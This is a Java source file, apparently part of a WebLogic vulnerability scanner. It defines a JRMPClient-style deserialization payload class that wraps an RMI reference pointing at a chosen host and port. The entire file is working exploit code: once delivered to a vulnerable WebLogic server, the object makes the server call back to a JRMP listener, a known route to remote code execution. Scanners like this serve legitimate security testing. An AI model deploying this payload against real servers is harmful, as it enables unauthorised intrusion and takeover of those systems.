package com.gbw.scanner.plugins.scripts.weblogic.payload;


import com.gbw.scanner.Host;
import com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;


import java.rmi.server.ObjID;
import java.util.Random;

public class GBWJRMPClient5 implements GBWNoEchoPayload<ReferenceWrapper_Stub> {

    public ReferenceWrapper_Stub getObject (Host host) {

        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host.getIp(), host.getPort());
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        ReferenceWrapper_Stub obj = new ReferenceWrapper_Stub(ref);
        return obj;
    }

    @Override
    public String getName() {
        return "GBWJRMPClient5";
    }

}
